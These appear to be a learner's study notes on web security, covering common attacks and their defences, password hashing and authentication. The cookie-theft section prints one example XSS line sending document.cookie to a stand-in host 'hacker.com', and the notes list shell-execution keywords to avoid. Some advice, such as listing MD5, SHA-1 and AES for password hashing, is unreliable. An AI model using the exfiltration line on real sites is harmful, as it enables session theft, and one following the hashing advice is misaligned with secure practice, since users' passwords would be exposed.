# Web Security
Keeping a web server and its applications protected or save from harm. Website are public and high-profile.

## Hacker
Hacker is the individual has technical skills about networking, developement, and creativity to inspect or discover vulnerbility of system. There are two kind of hacker, white hat hacker and black hat hacker.

### White hat hacker
This individual is not harm, they ussualy a professional network security or ordirary guy with curious about networking and find the vulnerbility so they can reporting to its developer to be fixed.

### Black hat hacker
Dangerous individual with behavior potentially to ruin and broke the system, opposite of white hat hacker, black hat hacker has many reason to do negative things.
* Curious users
* Thrill seekers
* Thropy hunters
* Script kiddies
* Political activist
* Professional

## Zero-day exploits
Security vulnerability known only to hackers, kept secret and traded. Hackers kept that vulnerability as long as posible from developer. Instead developer has had "zero days" of awareness to anticipate the uncovered vulnerability to shut down the vulnerability and make the system more secure before being hacked.

## Security level
Security of our system meassured by the lowest of aspect technology that we used. If we have new feature with new technology security level 4 then our security level of overall system is 4 as well. But we don't need 100% secure and it never be achieved. Should match your needs and goals. Let's say we will secure $100 of money, we just lock the door and save the money in home secure box. But if we want to secure $100 million of money, we must pay security guy and most advantage security system and cameras every corner.

## Security mindset
We need everybody in our office aware about vulnerability and security mindset. Maybe IT departement responsible to build standard of security and system but general staff still must have awareness about theirself that can be used to jump over the system to access the vulnerability. We need educate them to do practice of manage of security such as avoid write credentials in sticky note and leave it in their desk so everyone can get access to their computer and do some harm action. Keep in main about security mindset:
* Everyone need to be carefull all time
* Weakest link in your security is your level of security
* Average users have to be mindfull of security
* Security may require time and money
* Allocate for security in project timelines
* Take any raised security concern seriously
* Review all technology in use (hardware and software)
* Review code in use and still in develpment
* Review procedures
* Review access privileges
* Educate and re-educate (remind them periodically about security awareness)

## Security Policy
* Communicates how information assets are protected
* Rule or guideliness
* Keep it simple, clear and easy to follow
* Involve all stakeholders
* Review periodically - security concern changes

## Security Principle
* **Least Privileges**
Controlled data access, easy to test action and identify what action allow and not allowed by user. Vulnerabilities are limited and localized. Every program and every privileges user of the system should operate using the least amount of privilege necessary to complete the job.

* **Simple is more secure**
Larger and more complex a system, there are posibility having bugs and vulnerability. Break long section code into smaller pieces. Built-in function are often better than your own versions. Diable or remove unused features when possible.

* **Never trust users**
Users can cause problem, avoid human mistake such inputs in web, be paranoid into user behavior. Everyone potential to be hacker, don't even trust admin users completely or ex-employees.

* **Expect the unexpected**
Security is not reactive, we don't wait attack to recover, but we try prevent the attacker to attack. Get creative as user perpective, find out and curious anything to harm our system, such as what happen when user input is too long, contain symbol and high ASCII, ask yourself if it could broken our system and we prevent if it does.

* **Defense in depth**
Having extra security layer or layered defenses to slowing the advance of an attacker. Attacks lose momentum to destroy our system. Defense in depth are people (getting everyone educated, follow best practice, assigning the responsibility), technology (hardware, software, system administration, firewall, web server, database, encription) and operation (data handling prosedure, monitoring responsibility and how you respond the threat).

* **Security through obscurity**
The less information you give better, more information benefits hacker such as software or technology version. Limit exposed information and feedback such as error message. Obscurity is not missdirection, we don't need to change to random file or name or even database column table, because is not help improve the security instead it would confuse you as well.

* **Blacklisting and Whitelisting**
We mark features and permissions to available (allow) or not available, blacklisting mean add a feature to be restricted, instead whitelisting is the opposite. Whitelisting is more secure because we restrict all we do not use by default and put access with purpose and don't worry about forgot limit access, if we forgot to add new feature to whitelisting it just not work or available and don't produce vulnerability, but when we use blacklisting we forgot to add if it feature is not accessable then we expose by default instead whitelisting is restrict by default.

* **Map exposure points and data passageways*
Check incoming and outgoing exposure points security. Incoming point such as url, forms, cookies or sessions, database reads, public APIs. Outgoing information such as HTML, javascript, json, xml, rss, cookies or sessions, database writes and third-party APIs. Map the data as move through your application, what path does data take in our system, and understand topography. Simple equation about security is **Awareness + Protection = Security**.

## Filtering input and controlling output
### Regulate request method
We need to narrow communication in network (request-respond) to limit and expect what we sent and what we want. Protocol HTTP has verb request such: 
* GET requests: URLs, links
* POST requests: forms
* CONNECT, DELETE, HEAD, OPTIONS, PUT, TRACE, etc

Regulate request/response typically has format in key-value format. They can be faked but we limiting the posibility of vulnerability. We could check this value to expect what is the request/response data format:
* "Content-Type" is format of sent data
* "Accept" is format for return data

### Validating inputs
Filter the inputs before processed, ask yourself is the input acceptable?. Validating also preventing bugs and corrupted data, such as data too long then system trim data without feedback that input is modified from original. Validating also give standard and expecting format data in submissions. Provide default value if invalid value forced to store in our system. Common validation proceed in client side, server side and database. Convinient to perform validation all that layer like writen down in security priciple also client validation could be tricked to be passed.

### Sanitizing data
One of most important in security, think is the data potentially dangerous? According security principle about "don't trust user" so we expect whatever user uploaded file into system we make sure is harmless or we force the file to be harm less by sanitizing it. Sanitizing all SQL, html, javascript, json, xml, etc. Encoding characters to replace powerful character such as "<" with "&lt;" (character entities) so the interpreter do not parse into part of language but as entity to display.  Escaping the character before powerful characters, we usualy escaping string in query because input can be anything and it could break the query such " ' (single quote)". In programming language there is terms Type casting and Type juggling, where type casting is, that we control to cast or convert the data or variable into specific type before we use it. Instead, type juggling is leave the programming language to take control what should it does where we compare or operate two or more data, imagine we put value 1 check if it's equal with string "1". Do not write custom sanitization methods.

### Labeling data
Use names to identify condition of data, when we get user inputs put it variable name like dirty, raw, tainted, or unsafe, then perform filtering, validation and sanitizing the put into another labeled variable like clean, filtered, sanitized, safe, etc. Or we use single variable by passing dirty input in sanitizing method that called from safe variable.

### Keeping code private
You just exposure functionality that needed only, we don't show detail of how we do that job. Must keep our code private, organize public-private area. These areas including directory, file, class, variable and method.

### Keeping credential private
Plain text credentials are dangerous, keep them separate from code, keep them out of version control system. No reason to save password except it hashed or encrypted. Do not reuse passwords, unique each computer, environment or database.

### Keeping error messages vague
We hide details of error message, just return error code and general message. We keep detail of errors in log system behind the scene. Configure web server to use same error pages like application error.

### Smart Logging
Data worth to logging, keep data in log such as date and time, source (user/IP address), action to do, target detail of data result, cookie, session, URL and all parameters, backtrace (stacktrace error). We're not log error only, but activity as well, keep an activity history or audit trail and review logs routinely. Don't log sensitive data such user input password, token, keys, database queries because logs may be stollen. Keep old content, versioning data, keep the history and do paranoid delete, give record data flag or move the data to indicate the file is unavailable anymore in application but they still exist in the server/database and can be restored by Administrator.

## Most Common Attacks
### Cross-site Scripting (XSS)
Hacker can inject javascript into a web pages, used to trick users into running javascript code. Usualy used to steal cookies as well as session data that related to cookie. Called cross-site because scripting is done via another website, successful because browser trusts the javasript.

Solutions: Sanitize any dunamic text that gets output to browser. Careful about database, cookie, and session. Whitelist the allowed HTML tags or scripts if necessary.

### Cross-site Request Forgery (CSRF)
Hacker tricks users into making a request to your server. Can be used for fraudulent clicks, can take advantage of a user's logged in state. 

Solutions: GET request should be idempotent (makes no changes, can be called repeatedly), only use POST request for making changes. Add token validation in form that generate when user request the form and save into session and will validate when the form send back to server.

### SQL Injection
Hacker is able to execure arbitrary SQL requests. Can be used to probe database schema, trial and error looking for valid SQL. Can be used to steal database data. Can be used to add or change database data or even destroy database itself. Usualy hacker inject SQL code via form that send to server.

Solutions: give limited privileges to application's database user, don't add grant, create, drop, modify (DDL). Sanitize input and escape danger character  to harmless.

### URL Manipulation
Editing the URL string to probe the site, can be used for revealing private information. Can be used for performing restricted actions.

Solutions: realize that URLs are exposed and editable, pages can be accessible via "deep links". Don't use obscurity for access control, keep error message vague. Clarify your GET and POST request.

### Faked request and Forms
Request header information can be manufacture (normally generated by browser), called "faked" or "poofed". There are plugins and tools for all major browsers. Aware HTML forms can be duplicated. Can be used to add or remove form values. Can be used to edit hidden field values.

Solutions: Do not rely on form structure for data validation. Do not rely on client-side data validation, use HTTP Referer to enforce same-domain forms.

### Cookie visibility and Theft
Cookie data is visible to users, cookie can be stolen using XSS attack 'http://hacker.com?steal='+document.cookie. Cookie can be sniffed by observing network traffic. Use HttpOnly cookies, use secure cookies (HTTPS only), set cookie expiration date.

Solutions: Excrypt cookie data, use server-side sessions instead of client-side cookies.

### Session Hijacking
Session identified by SESSIONID in cookie that available in browser. Similar to cookie theft bu much more valuable. Can be used to assume your identity and logged in status and be you. As example you login into facebook and hacker hijack your session, then to facebook they're like you because they have session ID. Often done by network eavesdropping, beware of open wireless networks at coffee shops.

Solutions: save user agent in session and confirm it, in different browser need to login (weak). Check IP address (buggy because IP address can changes in Phones, or change source of wired network/wifi), better use HttpOnly cookies (Can't access cookie from javascript), regenerate session identifier periodically, at key points especially important to regenerate after log in, expire/remove old session files regularly, best use SSL, use secure cookies (SSL only).

### Session Fixation
Trick a user into using a hacker-provided session identifier, so you logged in hacker via your credential (remember website identify you login status by sessionID in browser). can be used to assume your identity and logged in status. Can be used to steal personal info, change password.

Solutions: do not accept session identifiers from GET or POST variable, regenerate session identifier periodically, at key points especially important to regenerate after log in. Expire/remove old session files regularly.

### Remote System Execution
Remotely run operating system commands on a webserver, can be used to do anything your operating system can do, this is the most powerful hack because you overtake the computer server in system operation level.

Solution: avoid system excution keywords (system, exec, shell, sh, open, call eval, spawn, etc), perform system execution with extreme caution, sanitize any dynamic data carefully, understand the commands and their syntac completely, add additional data validations.

### File upload abuse
Abuse of allowed file upload features, can be used to upload too much (quantity, file size), san be used to upload malicious files.

Solutions: require user authentication, no anonymous uploads, limit maximum upload size, limit allowable file formats, file extensions, use caution when opening uploaded files. do not host uploaded files which have not been verified.

### Denial of Service (DoS)
Attempt to make a server unavailable to users, usually performed by overloading a server with requests, includes DNS and routing disruption. Attacks ofter performed by distributed network (DDoS), zombie computer that have task another denial of service attack. Cheap to launch, difficult to prevent, usually performed by person or group with a grudge, can be used as a distraction from other hacking attempts.

Solutions: install firewalls, switches and routers, there is limiting feature, add load management hardware/software, collection of reverse proxies. Map your infrastructure and make it up to date, purchase high-quality hosting and equipment, make network traffic visible. Develop a response plan, change IP address (temporary), "black hole" or "null route" traffic (redirect DoS to somewhere else).

## Encryption and Authentication
### Password Encryption
Never store passwords in plain text, compromises users on your site and other tises, do hashing algorithm which is one-way encryption means non-reversible, even by us. Same inputs + same hashing algorithm = same output.
* MD5
* SHA-1
* SHA-2 (SHA-256, SHA 512)
* Whirlpool
* Tiger
* AES
* Blowfish (secure, free, easy, slow)

### Salting Passwords
Rainbow tables is pre-computed tables of password hashes for each hashing algorthm. Salt is additional data added to the password before encryption. Eg. we store hashed password with additional text in front of it "Put salt on the {$password}", knowing password requires also knowing the salt string. Rainbow table could be used, but they would be almost impossibly large. Create unique salt using strings unique to each user or using pesudo-random string as salt but we must know the random string to compare the password to check legitimate user. Store salt in database, when usign user data for salt and user data could change when using random salt, just the salt not the password. Hash the salt so it will not be plain text.

### Password requirements
Require length, but do not limit length. Require non-alphanumeric characters and force user to confirm password, report password strength. Do not record a password hint.

### Brute Force Attack
You trying all posibilities combination to force get access. Systematically trying all possible input combinations until the correct solution is found using dictionary attack. Different with rainbow table brute force does not need hashed password, with nothing information we try all posibilities. Key space (key length) x time per attemp = Time required. Key space allow all characters to increase time required to brute force and also allow long strings. Add timing and throttling to delay user if they to much attempt login. Logging activity and must notify administrator if there is malicelious activity.

### Using SSL for Login
Secure Sockets Layer provide communication security, verifies authenticity of remote server, encrypts all data exchanged with server. Prevents snooping, sesion hijacking, but there is performance penalty due to encryption/descryption time, requires all assets to be secure.

### Multi-factor Authentication
Authentication requires two (or more) factors, something only the user knows, has, and is. Eg Bank ATM card, you must "has" card and "knows" PIN. Another example is number-generating ID device, "knows" password "has" device present right now. Something only the user is biometrics, fingerprint, voice, retina. Or in web implementation is the computer that user has. Another case using email to account that contain passlock code or PIN that must input after login. Call phone or messaging can used as media to deliver code as well. But most users are not familiar yet, add effort to provide additional data.
